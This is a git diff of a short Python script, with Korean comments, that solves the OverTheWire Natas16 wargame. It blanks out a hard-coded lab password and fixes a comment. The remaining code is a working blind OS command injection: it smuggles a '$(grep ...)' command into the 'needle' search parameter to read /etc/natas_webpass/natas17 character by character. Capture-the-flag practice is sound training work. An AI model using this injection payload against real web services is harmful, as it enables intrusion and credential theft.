@@ -2,7 +2,8 @@ import requests
 import string
 
 url = "http://natas16.natas.labs.overthewire.org/"
-natas16_cred = "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb"
+# 나타스 비밀번호 직접 대입
+natas16_cred = ""
 
 s = requests.Session()
 s.auth = ("natas16", natas16_cred)
@@ -16,7 +17,7 @@ def blind_os_command_inject(search_word):
   
   # natas의 비밀번호 길이는 32자로 정해져있어서 32번 반복
   for i in range(1, 33):
-    # 하나하나 비교하면서 출력(blind_sqli와 동일하게 반복
+    # 하나하나 비교하면서 출력(blind_sqli와 동일하게 반복)
     for ch in char_set:
       payload = f"$(grep ^{password + ch} /etc/natas_webpass/natas17){search_word}"
       parms = {"needle":payload, "submit": "Search"}
